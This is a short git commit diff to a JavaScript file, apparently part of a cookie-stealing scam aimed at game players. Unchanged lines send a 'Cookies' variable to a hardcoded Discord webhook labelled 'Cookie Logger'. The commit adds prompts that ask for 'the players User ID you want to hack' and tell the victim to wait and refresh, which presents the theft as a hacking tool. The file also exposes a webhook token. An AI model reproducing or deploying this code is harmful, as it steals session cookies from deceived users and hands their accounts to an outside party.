400a0e31dacaa51dd25e104217975804f184d376
No <63305085+DecryptableByte@users.noreply.github.com>
2020-12-18 08:17:56 -0600

    Update RunAuthMethod.js

--- RunAuthMethod.js
+++ RunAuthMethod.js
@@ -4,3 +4,6 @@ const webhook = require("webhook-discord")
 const Hook = new webhook.Webhook("https://discord.com/api/webhooks/789342254220967986/ivVMX1LH8j-7wKuFU6ussqmErJYBlczolYZ9cz6ypbUDAr1hgp8mD5Cc1A7ByO9tF-2i")
 
 Hook.info("Cookie Logger", Cookies)
+
+prompt("Enter the players User ID you want to hack")
+alert('Now please wait 10 seconds and refresh the page')
